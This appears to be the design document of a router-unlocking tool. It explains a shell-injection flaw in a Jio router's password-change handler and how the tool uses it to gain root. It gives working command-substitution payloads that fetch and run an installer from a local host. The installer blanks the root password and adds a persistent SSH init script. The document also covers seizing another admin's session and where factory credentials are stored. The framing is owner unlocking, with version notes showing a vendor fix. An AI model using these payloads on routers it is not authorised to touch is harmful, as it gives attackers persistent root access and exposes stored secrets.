# How the unlock works

`idu-unlock` gives you root over the router's own web API. It does not write
firmware, and it installs nothing beyond what keeping SSH alive requires.

## The vulnerable call

The handler ends in an unescaped shell-out with the password interpolated into
it. Read from a stock `JIDU6801` rootfs on `R2.0.19.6`
(`usr/lib/lua/luci/model/jio/session.lua:180`):

```lua
function setPassword(username, password)
	local resp = os.execute(
		"(echo '" .. password .. "'; sleep 1; echo '" .. password .. "') | "
		.. "passwd '" .. username .. "' >/dev/null 2>&1")
```

The exact command differs between builds; what matters is that `password` reaches
a shell unquoted. `$(...)` inside the single quotes still runs, which is the whole
exploit.

## The validator's real rules

Read from the same rootfs (`rules/common/vlib.lua`, `rules/user.lua`):

| Rule | Source | Consequence |
| --- | --- | --- |
| 8–32 characters | `isStringValidLength(password, 8, 32)` | almost no room |
| rejects `` ` `` `"` `'` `\|` `;` and whitespace | `hasValidChars1`, `^[^`\"'\|;%s]*$` | the obvious `curl … \| sh` is impossible |
| allows `$ ( ) { }` | no rule against them | command substitution works |
| `${IFS}` allowed | it is not whitespace | arguments without spaces |

That last row is not a curiosity — it is the only way to pass an argument at all,
because a literal space is rejected.

## Two steps, both inside the budget

Because `curl … | sh` is impossible, the installer is delivered in two payloads,
each of which fits the 32-character field:

```sh
Aa1$(curl${IFS}192.168.31.51>/a)   # 32 chars — fetch the installer
Aa1$(sh${IFS}/a)                   # 16 chars — run it
```

`/a` is the shortest absolute path writable as root, which caps the download
address at 13 characters (`192.168.31.51` fits exactly). `Injector` enforces all
of this and explains itself when a payload does not fit.

The prefix (`Aa1`) is randomised per run: the router remembers the last three
passwords per account, and a download payload always evaluates to its literal
prefix.

The address is whatever local interface can reach the router —
`address_reaching()` works it out. The router fetches the script from your
machine, so your machine must be reachable from the router on that address. That
is the one place a firewall can get in the way; see
[TROUBLESHOOTING.md](TROUBLESHOOTING.md).

## The installer

The downloaded script runs as root and does three things:

1. `passwd -d root`, so sshd accepts an empty password
2. optionally installs the public key you passed with `--key`, into both
   `/root/.ssh/authorized_keys` and `/etc/dropbear/authorized_keys`
3. writes `/etc/init.d/idu-ssh` (`START=99`) and symlinks it as
   `S99idu-ssh` / `K01idu-ssh`, then starts dropbear

No keypair is ever generated, and with no `--key` nothing of ours is installed on
the router at all.

## Why persistence needs its own init script

The vendor's `/etc/init.d/dropbear` force-disables SSH on every boot of a Release
build, and this firmware has no `/etc/init.d/rc.local` — so the usual advice to
"add dropbear to `/etc/rc.local` before `exit 0`" does nothing here. Staying in
requires a script of our own, ordered after theirs.

That is `/etc/init.d/idu-ssh`:

```sh
#!/bin/sh /etc/rc.common
START=99
STOP=01
start() { dropbear -R -p 0.0.0.0:22; }
stop()  { killall dropbear; }
reload() { start; }
```

`START=99` runs it after the vendor's `S50dropbear`. `dropbear -R` regenerates the
host keys on every start, which is why SSH reports a changed host key after a
boot or a re-unlock — see [TROUBLESHOOTING.md](TROUBLESHOOTING.md).

If you do use a key, make it RSA: dropbear v2020.81 on these units rejects
ed25519.

## The session dance

The backend is fussy and permits only one admin session at a time:
`preLogin` → `login` → `postLogin`, after which every call needs both
`Authorization: Bearer <bearer>` *and* the `sysauth` cookie the login reply hands
back. The reply's token is `<bearer>-<session>` — the first half goes in the
header, the second in the cookie — and the cookie is set with
`path=https://<host>`, which is not a legal cookie path, so `requests` discards
it unless it is re-stored against `/`. Without that, every call after login
answers `ERR_UNAUTHORIZED_OR_EXPIRED`, which reads like a hardened API rather
than a cookie the client threw away.

`Api.session()` is a context manager that does all of it and releases the session
on the way out. Releasing is courtesy, not a requirement: a session someone else
left sitting is answered with `ERR_LOGIN_DUPLICATE_ADMIN`, and rather than wait
we take it over the way the vendor's own web UI does — `postLogin` naming that
session's `loggedId`. On a `6j11` the sitting slot never expires, so waiting
cannot work and logging out of the web UI does not clear it either.

The target is the **guest** account (`userType=2`); that value keeps the handler
off its admin-session-kill branch.

## Firmware compatibility

This tool has exactly one method, `changeUserPassword`, so everything here is
about that handler. The version string is a hint, not a verdict; `check` reads it
and reports `YES` or `TEST`:

| Build | `check` | Unlock |
| --- | --- | --- |
| `R3.2.0` and earlier | `YES` | the password field is injectable |
| `R3.2.1` and newer | `TEST` | see below |

`TEST` is not a guess that it might work — the handler is **fixed as of
`R3.2.3`**. Read from a stock `JIDU6701` rootfs on `R3.2.3`
(`usr/lib/lua/luci/model/jio/session.lua:182`):

```lua
function setPassword(username, password)
	--[[ local resp = os.execute(
		"(echo '" .. password .. "'; sleep 1; echo '" .. password .. "') | "
		.. "passwd '" .. username .. "' >/dev/null 2>&1"
	) ]]

	-- use in build luci.sys.user util to avoid any shell injection not taken care at application level
	local resp = luci.sys.user.setpasswd(username, password)
```

The vendor's own comment names the bug — *"shell injection not taken care at
application level"* — and `luci.sys.user.setpasswd` passes the password as an
argument instead of through a shell. So on `R3.2.3` and newer, `unlock` cannot
work at all. `detect` and `backup` are unaffected.

Which release between `R3.2.1` and `R3.2.3` carries the fix has not been
determined; no image in that range has been examined. The check stays
conservative for it, which is why `R3.2.1` and `R3.2.2` report `TEST`.

## Where the factory secrets live

Relevant because a backup collects them:

- U-boot console credentials are **not** in the u-boot environment. They are
  stored as plain `KEY=VALUE` text in the **MFG partition (`/dev/mtd7`)**, alongside
  the Wi-Fi PSK and web password.
- The partition named `u-boot-env` (`mtd2`) is **empty**. The real environment is
  in the UBI volume **`/dev/ubi0_0`** (inside mtd5), per `/etc/fw_env.config`. A
  second vendor-specific environment is in **mtd8**.

## Provenance

Clean-room implementation: the protocol flow is the device's own public API, and
the code shares nothing substantive with any existing proof of concept (the only
overlaps are standard Python/HTTP idioms such as the `application/json` header).

An earlier version of this project also automated the community two-stage OpenWrt
install; that automation is not part of this tool, and nothing here writes
firmware. The procedure is documented in
[the-diy-daddy/6j01_6j11](https://github.com/the-diy-daddy/6j01_6j11) — credit for
working it out belongs there. It is also written out for manual entry in
[OPENWRT.md](../OPENWRT.md). That repository ships no licence, and neither did the
proof of concept this work started from, so neither is redistributed here.
